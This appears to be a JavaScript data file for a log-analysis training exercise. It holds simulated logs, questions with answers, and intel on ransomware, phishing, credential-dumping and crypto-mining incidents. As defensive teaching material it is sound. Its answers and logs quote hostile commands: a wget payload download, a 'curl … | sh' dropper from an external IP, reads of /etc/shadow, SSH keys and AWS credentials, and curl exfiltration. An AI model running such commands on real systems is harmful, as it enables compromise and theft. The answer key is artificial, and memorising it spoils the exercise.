      'Jun 17 22:17:13 fs-prod-07 systemd[1]: Stopped Bareos File Daemon (backup agent).',
      'Jun 17 22:17:20 fs-prod-07 update.bin[6013]: enumerating /srv/shares (48211 files)',
      'Jun 17 22:17:34 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 9200 files modified in 14s',
      'Jun 17 22:17:50 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 18700 files modified in 30s',
      'Jun 17 22:18:21 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 41020 files modified in 61s',
      'Jun 17 22:18:40 fs-prod-07 update.bin[6013]: wrote 48211 files with extension .LOCKBIT3',
      'Jun 17 22:18:41 fs-prod-07 update.bin[6013]: dropped ransom note RESTORE-MY-FILES.txt in 312 directories',
      'Jun 17 22:18:55 fs-prod-07 kernel: outbound connection ESTABLISHED SRC=10.0.9.7 DST=193.43.55.12 DPT=443',
      'Jun 17 22:19:30 fs-prod-07 update.bin[6013]: encryption complete; self-deleting',
      'Jun 17 22:20:01 fs-prod-07 CRON[6200]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 17 22:45:11 fs-prod-07 smbd[7001]: client 10.0.9.55 reported 0 readable files in /srv/shares/finance'
    ],

    questions: [
      { q: 'What is the filename of the ransomware payload that was downloaded?', a: 'update.bin',
        hint: 'Look for a sudo wget command pulling a binary from an external IP into /tmp.',
        evidence: 'sudo wget http://193.43.55.12/update.bin -O /tmp/update.bin downloaded the payload, then it was chmod +x and run.' },
      { q: 'What file extension did the ransomware append to encrypted files?', a: '.LOCKBIT3',
        hint: 'Check the log line reporting the bulk file rewrite and its extension.',
        evidence: 'update.bin "wrote 48211 files with extension .LOCKBIT3" — the LockBit 3.0 marker.' },
      { q: 'What did the malware delete to prevent recovery?', a: 'volume shadow copies',
        hint: 'Ransomware disables recovery before encrypting — look right after execution.',
        evidence: 'update.bin "deleting volume shadow copies" plus stopping the LVM2 snapshot and backup services.' },
      { q: 'Which backup service was stopped by the attacker?', a: 'Bareos File Daemon (backup.service)',
        hint: 'A systemd service deactivation right before encryption inhibits recovery.',
        evidence: 'systemd stopped "Bareos File Daemon (backup agent)" / backup.service to inhibit recovery.' },
      { q: 'How many files were encrypted?', a: '48211',
        hint: 'The enumeration line and the final write line both report the file count.',
        evidence: 'Both "enumerating /srv/shares (48211 files)" and "wrote 48211 files" confirm the count.' },
      { q: 'What is the attacker/C2 IP the payload came from and beaconed to?', a: '193.43.55.12',
        hint: 'The download source and the outbound ESTABLISHED connection share one IP.',
        evidence: 'update.bin was fetched from 193.43.55.12 and the host beaconed back to 193.43.55.12:443.' }
    ],

    intel: {
      ioc: ['Files renamed with .LOCKBIT3 extension', 'RESTORE-MY-FILES.txt ransom notes', 'Volume shadow copies deleted', 'Backup/snapshot services stopped', 'Massive write burst (48211 files in ~2 min)', 'C2 IP 193.43.55.12'],
      risk: ['Total loss of availability for /srv/shares (finance data unreadable)', 'Recovery crippled — shadow copies and backups destroyed', 'Possible double-extortion (data exfil before encryption)', 'Spread risk to other SMB clients'],
      attackSteps: [
        { phase: 'Initial Access', detail: 'SSH login as fileadmin from an internal host (likely already compromised)', mitre: ['T1078'] },
        { phase: 'Ingress Tool Transfer', detail: 'Downloaded update.bin payload via sudo wget from the C2', mitre: ['T1105'] },
        { phase: 'Inhibit Recovery', detail: 'Deleted shadow copies and stopped snapshot/backup services', mitre: ['T1490', 'T1489'] },
        { phase: 'Impact', detail: 'Encrypted 48211 files (.LOCKBIT3) and dropped ransom notes', mitre: ['T1486'] }
      ],
      mitigation: ['Maintain offline / immutable backups (3-2-1) and test restores', 'Restrict sudo and egress to block payload download', 'EDR to detect shadow-copy deletion and mass file writes', 'Network-segment file servers; alert on backup-service stops', 'Isolate the host immediately and preserve memory for IR'],
      frameworks: {
        mitre: [
          { id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
          { id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
          { id: 'T1489', name: 'Service Stop', tactic: 'Impact' },
          { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' }
        ],
        nist: ['PR.IP-4 Backups of information', 'PR.DS-1 Data-at-rest protection', 'RS.MI-1 Incidents are contained', 'RC.RP-1 Recovery plan execution'],
        owasp: ['A08:2021 - Software and Data Integrity Failures'],
        cvss: { score: 8.6, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H', severity: 'High' }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 7: Phishing -> Malware Download
  // ===========================================================================
  'phishing-malware': {
    title: 'Phishing to Malware Download',
    difficulty: 2,
    logSource: 'mail.log + proxy.log',
    mitreTags: 'T1566.002, T1204.002, T1071.001',
    description: 'A targeted phishing email slipped past the filter. Trace the path from email delivery, through the user clicking a link, to the malware download and its first callback. Correlate the mail gateway log with the web proxy log.',

    logs: [
      'Jun 16 09:01:12 mail-gw-01 postfix/smtpd[3110]: connect from unknown[185.234.219.88]',
      'Jun 16 09:01:13 mail-gw-01 postfix/cleanup[3112]: message-id=<invoice-8841@accounts-payable.co>',
      'Jun 16 09:01:13 mail-gw-01 opendkim[2200]: 4A1: DKIM verification failed (bad signature) from accounts-payable.co',
      'Jun 16 09:01:14 mail-gw-01 postfix/qmgr[3113]: 4A1: from=<billing@accounts-payable.co>, to=<rwilson@corp.example.com>, subject="Overdue Invoice #8841 - Action Required"',
      'Jun 16 09:01:14 mail-gw-01 spamd[2400]: result: . 2.1 - score below quarantine threshold; delivered',
      'Jun 16 09:23:40 proxy-01 squid[4501]: 10.0.3.71 GET https://accounts-payable.co/invoice/8841 200 18221 "Mozilla/5.0" rwilson',
      'Jun 16 09:23:55 proxy-01 squid[4501]: 10.0.3.71 GET https://accounts-payable.co/invoice/8841/download 302 0 "Mozilla/5.0" rwilson',
      'Jun 16 09:23:56 proxy-01 squid[4501]: 10.0.3.71 GET https://cdn-files.accounts-payable.co/Invoice_8841.zip 200 540210 "Mozilla/5.0" rwilson',
      'Jun 16 09:24:30 proxy-01 squid[4501]: 10.0.3.71 GET https://cdn-files.accounts-payable.co/Invoice_8841.zip 200 540210 "Mozilla/5.0" rwilson',
      'Jun 16 09:25:02 host-rwilson winlog[5001]: Process created: Invoice_8841.exe (extracted from Invoice_8841.zip) parent=explorer.exe',
      'Jun 16 09:25:03 host-rwilson winlog[5001]: Process created: powershell.exe -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0... parent=Invoice_8841.exe',
      'Jun 16 09:25:09 proxy-01 squid[4501]: 10.0.3.71 POST http://104.21.66.190/gate.php 200 12 "WinHTTP" -',
      'Jun 16 09:30:09 proxy-01 squid[4501]: 10.0.3.71 POST http://104.21.66.190/gate.php 200 12 "WinHTTP" -',
      'Jun 16 09:35:09 proxy-01 squid[4501]: 10.0.3.71 POST http://104.21.66.190/gate.php 200 12 "WinHTTP" -',
      'Jun 16 09:40:09 proxy-01 squid[4501]: 10.0.3.71 POST http://104.21.66.190/gate.php 200 12 "WinHTTP" -',
      'Jun 16 09:42:18 mail-gw-01 postfix/smtpd[3140]: connect from mx.partner.example[203.0.113.9]'
    ],

    questions: [
      { q: 'What is the sender email address of the phishing message?', a: 'billing@accounts-payable.co',
        hint: 'Check the postfix qmgr line with the from= field and the suspicious subject.',
        evidence: 'postfix qmgr: from=<billing@accounts-payable.co>, subject "Overdue Invoice #8841 - Action Required".' },
      { q: 'Which authentication check failed, signalling a spoofed sender?', a: 'DKIM',
        hint: 'An email-authentication mechanism reported a bad signature at delivery time.',
        evidence: 'opendkim: "DKIM verification failed (bad signature) from accounts-payable.co".' },
      { q: 'What is the filename of the downloaded malware archive?', a: 'Invoice_8841.zip',
        hint: 'Follow the proxy log after the user opens the invoice link — look for a downloaded archive.',
        evidence: 'GET https://cdn-files.accounts-payable.co/Invoice_8841.zip 200 540210 — the malware archive.' },
      { q: 'What did the extracted executable spawn to run its payload?', a: 'powershell.exe (encoded -enc command)',
        hint: 'Look at the child process created by Invoice_8841.exe on the host.',
        evidence: 'Invoice_8841.exe spawned powershell.exe -enc <base64> — an encoded PowerShell stager.' },
      { q: 'What is the C2 server IP the malware beacons to?', a: '104.21.66.190',
        hint: 'Find the repeating POST requests on a regular interval to a gate.php endpoint.',
        evidence: 'Repeated POST http://104.21.66.190/gate.php every 5 minutes with the WinHTTP user-agent is the C2 beacon.' },
      { q: 'Which internal user was the phishing target?', a: 'rwilson',
        hint: 'The recipient in the mail log and the proxy username match.',
        evidence: 'to=<rwilson@corp.example.com> and the proxy requests are attributed to user rwilson.' }
    ],

    intel: {
      ioc: ['Sender accounts-payable.co with failed DKIM', 'Invoice_8841.zip / Invoice_8841.exe', 'powershell.exe -enc encoded command', 'Beacon to 104.21.66.190/gate.php (WinHTTP, 5-min interval)', 'Lookalike domain cdn-files.accounts-payable.co'],
      risk: ['Endpoint compromise of host-rwilson', 'Encoded PowerShell stager → further payloads', 'Established C2 channel for hands-on-keyboard activity', 'Credential theft and lateral movement likely next'],
      attackSteps: [
        { phase: 'Phishing', detail: 'Spoofed invoice email delivered despite failed DKIM (score below threshold)', mitre: ['T1566.002'] },
        { phase: 'User Execution', detail: 'User opened the link and ran Invoice_8841.exe from the zip', mitre: ['T1204.002'] },
        { phase: 'Execution', detail: 'Malware launched an encoded PowerShell stager', mitre: ['T1059.001'] },
        { phase: 'Command and Control', detail: 'Regular HTTP POST beacons to 104.21.66.190/gate.php', mitre: ['T1071.001'] }
      ],
      mitigation: ['Tune the mail filter to quarantine DKIM/SPF/DMARC failures', 'Block newly-registered / lookalike domains at the proxy', 'Disable macro/zip-exe execution; application allow-listing', 'EDR detection of encoded PowerShell', 'User awareness training and easy phishing-report button'],
      frameworks: {
        mitre: [
          { id: 'T1566.002', name: 'Phishing: Spearphishing Link', tactic: 'Initial Access' },
          { id: 'T1204.002', name: 'User Execution: Malicious File', tactic: 'Execution' },
          { id: 'T1059.001', name: 'Command and Scripting Interpreter: PowerShell', tactic: 'Execution' },
          { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', tactic: 'Command and Control' }
        ],
        nist: ['PR.AT-1 Awareness training', 'DE.CM-4 Malicious code detection', 'DE.CM-1 Network monitoring', 'PR.IP-1 Baseline configuration'],
        owasp: ['A07:2021 - Identification and Authentication Failures'],
        cvss: { score: 8.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H', severity: 'High' }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 8: Credential Dumping
  // ===========================================================================
  'cred-dump': {
    title: 'Credential Dumping',
    difficulty: 4,
    logSource: 'audit.log (auditd)',
    mitreTags: 'T1003.008, T1552.001, T1552.003',
    description: 'A Linux host\'s audit log captured an attacker harvesting credentials after gaining a foothold. Work through the auditd records to identify which secret stores were accessed and how the attacker collected credentials for reuse.',

    logs: [
      'Jun 15 04:12:01 app-prod-09 audit[1]: USER_LOGIN pid=4410 uid=0 msg=\'op=login acct="deploy" exe="/usr/sbin/sshd" hostname=45.61.130.7 res=success\'',
      'Jun 15 04:13:22 app-prod-09 audit[4420]: SYSCALL arch=c000003e syscall=59 success=yes comm="id" exe="/usr/bin/id" key="exec"',
      'Jun 15 04:13:40 app-prod-09 audit[4421]: SYSCALL syscall=2 success=yes comm="cat" exe="/bin/cat" name="/etc/passwd" key="sensitive-read"',
      'Jun 15 04:13:55 app-prod-09 audit[4422]: SYSCALL syscall=2 success=yes comm="sudo" exe="/usr/bin/sudo" name="/etc/shadow" key="sensitive-read"',
      'Jun 15 04:14:30 app-prod-09 audit[4430]: SYSCALL syscall=2 success=yes comm="cat" exe="/bin/cat" name="/home/deploy/.bash_history" key="sensitive-read"',
      'Jun 15 04:14:51 app-prod-09 audit[4431]: SYSCALL syscall=2 success=yes comm="cat" exe="/bin/cat" name="/home/deploy/.ssh/id_rsa" key="sensitive-read"',
      'Jun 15 04:15:08 app-prod-09 audit[4432]: SYSCALL syscall=2 success=yes comm="find" exe="/usr/bin/find" name="/var/www" key="sensitive-read"',
      'Jun 15 04:15:09 app-prod-09 audit[4432]: PATH name="/var/www/app/.env" nametype=NORMAL',
      'Jun 15 04:15:25 app-prod-09 audit[4433]: SYSCALL syscall=2 success=yes comm="cat" exe="/bin/cat" name="/var/www/app/.env" key="sensitive-read"',
      'Jun 15 04:15:44 app-prod-09 audit[4440]: SYSCALL syscall=2 success=yes comm="grep" exe="/bin/grep" name="/home/deploy/.aws/credentials" key="sensitive-read"',
      'Jun 15 04:16:10 app-prod-09 audit[4445]: SYSCALL syscall=59 success=yes comm="gcore" exe="/usr/bin/gcore" key="exec"',
      'Jun 15 04:16:12 app-prod-09 audit[4445]: PATH name="/proc/2901/mem" nametype=NORMAL',
      'Jun 15 04:16:48 app-prod-09 audit[4450]: SYSCALL syscall=59 success=yes comm="tar" exe="/bin/tar" key="exec"',
      'Jun 15 04:16:49 app-prod-09 audit[4450]: PATH name="/tmp/loot.tar.gz" nametype=CREATE',
      'Jun 15 04:17:20 app-prod-09 audit[4460]: SYSCALL syscall=59 success=yes comm="curl" exe="/usr/bin/curl" key="exec"',
      'Jun 15 04:17:21 app-prod-09 audit[4460]: SOCKADDR saddr=45.61.130.7 port=443',
      'Jun 15 04:18:01 app-prod-09 audit[1]: USER_LOGOUT pid=4410 uid=0 acct="deploy" res=success'
    ],

    questions: [
      { q: 'Which account did the attacker use to log in over SSH?', a: 'deploy',
        hint: 'Check the USER_LOGIN audit record at the start.',
        evidence: 'USER_LOGIN acct="deploy" exe="/usr/sbin/sshd" hostname=45.61.130.7 res=success.' },
      { q: 'Which file containing password hashes did the attacker read?', a: '/etc/shadow',
        hint: 'Among the sensitive-read records, one file stores hashed passwords.',
        evidence: 'audit sensitive-read: name="/etc/shadow" via sudo — the password-hash store.' },
      { q: 'What private key did the attacker steal?', a: '/home/deploy/.ssh/id_rsa',
        hint: 'Look for a sensitive-read of an SSH private key in the user\'s home.',
        evidence: 'sensitive-read name="/home/deploy/.ssh/id_rsa" — the SSH private key.' },
      { q: 'Which application secrets file was accessed under /var/www?', a: '/var/www/app/.env',
        hint: 'A find under /var/www located a dotfile with app secrets that was then read.',
        evidence: 'find located /var/www/app/.env and cat read it — application secrets/credentials.' },
      { q: 'What cloud credentials file did the attacker grep?', a: '.aws/credentials',
        hint: 'One sensitive-read targets a cloud provider\'s credential file in the home directory.',
        evidence: 'grep on /home/deploy/.aws/credentials — AWS access keys.' },
      { q: 'What was the name of the archive the attacker created to stage the loot?', a: '/tmp/loot.tar.gz',
        hint: 'A tar process created a file right before the curl exfiltration.',
        evidence: 'tar created PATH name="/tmp/loot.tar.gz" (nametype=CREATE), then curl sent it to 45.61.130.7:443.' }
    ],

    intel: {
      ioc: ['Reads of /etc/shadow, .ssh/id_rsa, .env, .aws/credentials', 'gcore dumping /proc/<pid>/mem', 'Staging archive /tmp/loot.tar.gz', 'Outbound curl to 45.61.130.7:443', '.bash_history access'],
      risk: ['Credential reuse across SSH, AWS, and application services', 'SSH private key enables passwordless lateral movement', 'Cloud account compromise via leaked AWS keys', 'Password hashes exposed for offline cracking'],
      attackSteps: [
        { phase: 'Initial Access', detail: 'SSH login as deploy from attacker host 45.61.130.7', mitre: ['T1078'] },
        { phase: 'Credential Access', detail: 'Read /etc/shadow, SSH keys, .env, and .aws/credentials', mitre: ['T1003.008', 'T1552.001'] },
        { phase: 'Credential Access', detail: 'gcore dumped process memory to harvest in-memory secrets', mitre: ['T1003'] },
        { phase: 'Exfiltration', detail: 'Archived secrets to /tmp/loot.tar.gz and curl-ed them to the C2', mitre: ['T1552.003'] }
      ],
      mitigation: ['auditd alerts on sensitive-file reads and gcore/proc-mem access', 'Store secrets in a vault, not .env / dotfiles', 'Short-lived, scoped cloud credentials (no long-lived keys on hosts)', 'Passphrase-protect and rotate SSH keys', 'Egress filtering to block exfil; isolate and rotate all exposed secrets'],
      frameworks: {
        mitre: [
          { id: 'T1003.008', name: 'OS Credential Dumping: /etc/passwd and /etc/shadow', tactic: 'Credential Access' },
          { id: 'T1552.001', name: 'Unsecured Credentials: Credentials In Files', tactic: 'Credential Access' },
          { id: 'T1552.003', name: 'Unsecured Credentials: Bash History', tactic: 'Credential Access' },
          { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' }
        ],
        nist: ['PR.AC-1 Identity & access management', 'PR.DS-1 Data-at-rest protection', 'DE.CM-3 Personnel activity monitoring', 'DE.CM-7 Unauthorized activity monitoring'],
        owasp: ['A07:2021 - Identification and Authentication Failures', 'A02:2021 - Cryptographic Failures'],
        cvss: { score: 8.1, vector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N', severity: 'High' }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 9: Crypto Mining Detection
  // ===========================================================================
  'crypto-mining': {
    title: 'Crypto Mining Detection',
    difficulty: 2,
    logSource: 'syslog + process.log',
    mitreTags: 'T1496, T1059.004, T1053.003',
    description: 'A server\'s CPU has been pinned at 100% and its power bill is climbing. Investigate the system logs to confirm an unauthorized crypto-miner, find how it was installed, and identify the mining pool it connects to.',

    logs: [
      'Jun 14 03:02:10 build-ci-04 dockerd[990]: API request: pull image from registry-1.docker.io/library/alpine',
      'Jun 14 03:02:44 build-ci-04 sh[3201]: ci-runner executed: curl -s http://185.92.74.10/x.sh | sh',
      'Jun 14 03:02:46 build-ci-04 sh[3203]: x.sh: killing competing miners (kdevtmpfsi, kinsing)',
      'Jun 14 03:02:47 build-ci-04 sh[3203]: x.sh: writing /usr/bin/.xmrig and /etc/systemd/system/ntpupdate.service',
      'Jun 14 03:02:48 build-ci-04 systemd[1]: Reloading.',
      'Jun 14 03:02:49 build-ci-04 systemd[1]: Started ntpupdate.service (System NTP sync).',
      'Jun 14 03:02:50 build-ci-04 crontab[3210]: (root) REPLACE (root) - added @reboot /usr/bin/.xmrig',
      'Jun 14 03:02:55 build-ci-04 .xmrig[3220]: ABOUT XMRig 6.21.0 built for Linux x86_64',
      'Jun 14 03:02:55 build-ci-04 .xmrig[3220]: CPU threads 16 (max) huge pages 100%',
      'Jun 14 03:02:56 build-ci-04 .xmrig[3220]: net use pool pool.minexmr.com:4444 (TLS)',
      'Jun 14 03:02:57 build-ci-04 .xmrig[3220]: net new job from pool.minexmr.com diff 120001',
      'Jun 14 03:03:30 build-ci-04 kernel: CPU0: Core temperature above threshold, cpu clock throttled',
      'Jun 14 03:04:00 build-ci-04 collectd[770]: load1=15.94 cpu-user=98.7% (build-ci-04)',
      'Jun 14 03:09:00 build-ci-04 collectd[770]: load1=16.02 cpu-user=99.1% (build-ci-04)',
      'Jun 14 03:14:00 build-ci-04 collectd[770]: load1=16.10 cpu-user=99.3% (build-ci-04)',
      'Jun 14 03:14:21 build-ci-04 .xmrig[3220]: net accepted result (124/124) diff 120001',
      'Jun 14 03:20:00 build-ci-04 collectd[770]: load1=15.88 cpu-user=98.9% (build-ci-04)'
    ],

    questions: [
      { q: 'What mining software is running on the host?', a: 'XMRig',
        hint: 'Look for the process banner that announces a miner build for Linux.',
        evidence: '.xmrig process: "ABOUT XMRig 6.21.0 built for Linux x86_64" — the XMRig Monero miner.' },
      { q: 'How was the miner initially downloaded and run?', a: 'curl -s http://185.92.74.10/x.sh | sh',
        hint: 'Trace back to the first suspicious command executed by the CI runner.',
        evidence: 'ci-runner executed: curl -s http://185.92.74.10/x.sh | sh — a pipe-to-shell dropper.' },
      { q: 'What mining pool does the miner connect to?', a: 'pool.minexmr.com:4444',
        hint: 'Find the "net use pool" / "new job from" line.',
        evidence: '.xmrig: net use pool pool.minexmr.com:4444 (TLS) and "new job from pool.minexmr.com".' },
      { q: 'What persistence mechanisms did the dropper install? (name one)', a: 'systemd service (ntpupdate.service) and a @reboot cron job',
        hint: 'The script wrote a disguised service file and modified crontab.',
        evidence: 'x.sh wrote /etc/systemd/system/ntpupdate.service and crontab added "@reboot /usr/bin/.xmrig".' },
      { q: 'What disguised filename was the miner binary written as?', a: '/usr/bin/.xmrig',
        hint: 'The dropper wrote a hidden binary into a system path.',
        evidence: 'x.sh: "writing /usr/bin/.xmrig" — a hidden (dot-prefixed) binary in /usr/bin.' },
      { q: 'What CPU utilisation confirms the resource abuse (approx %)?', a: '99',
        hint: 'Check the collectd metric lines for sustained cpu-user percentage.',
        evidence: 'collectd reports sustained cpu-user ~98-99% with load1 ~16 on a 16-thread host.' }
    ],

    intel: {
      ioc: ['Process /usr/bin/.xmrig (hidden binary)', 'Connection to pool.minexmr.com:4444', 'Dropper from 185.92.74.10/x.sh', 'Disguised ntpupdate.service + @reboot cron', 'Sustained ~99% CPU / CPU temperature throttling', 'Killing of competing miners (kdevtmpfsi, kinsing)'],
      risk: ['Resource theft (CPU, power, cloud spend)', 'Service degradation / thermal throttling of the CI host', 'Foothold could be repurposed for worse payloads', 'Indicates an exposed/abused CI runner or RCE'],
      attackSteps: [
        { phase: 'Execution', detail: 'CI runner executed a curl|sh dropper from 185.92.74.10', mitre: ['T1059.004'] },
        { phase: 'Defense Evasion', detail: 'Killed competing miners and wrote a hidden binary disguised as an NTP service', mitre: ['T1036'] },
        { phase: 'Persistence', detail: 'Installed ntpupdate.service and an @reboot cron entry', mitre: ['T1053.003'] },
        { phase: 'Impact', detail: 'XMRig pinned 16 threads at ~99% CPU mining Monero to pool.minexmr.com', mitre: ['T1496'] }
      ],
      mitigation: ['Lock down CI runners (no arbitrary network egress / pipe-to-shell)', 'Block known mining pools and stratum ports at the firewall', 'Alert on sustained high CPU + new systemd/cron persistence', 'Application allow-listing; remove the binary, service, and cron entry', 'Rotate any secrets exposed on the compromised runner'],
      frameworks: {
        mitre: [
          { id: 'T1496', name: 'Resource Hijacking', tactic: 'Impact' },
          { id: 'T1059.004', name: 'Command and Scripting Interpreter: Unix Shell', tactic: 'Execution' },
          { id: 'T1053.003', name: 'Scheduled Task/Job: Cron', tactic: 'Persistence' },
          { id: 'T1036', name: 'Masquerading', tactic: 'Defense Evasion' }
        ],
        nist: ['DE.CM-1 Network monitoring', 'DE.CM-7 Unauthorized activity monitoring', 'PR.IP-3 Configuration change control', 'DE.AE-2 Event analysis'],
        owasp: ['A05:2021 - Security Misconfiguration'],
        cvss: { score: 6.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H', severity: 'Medium' }
      }
    }
  }

};
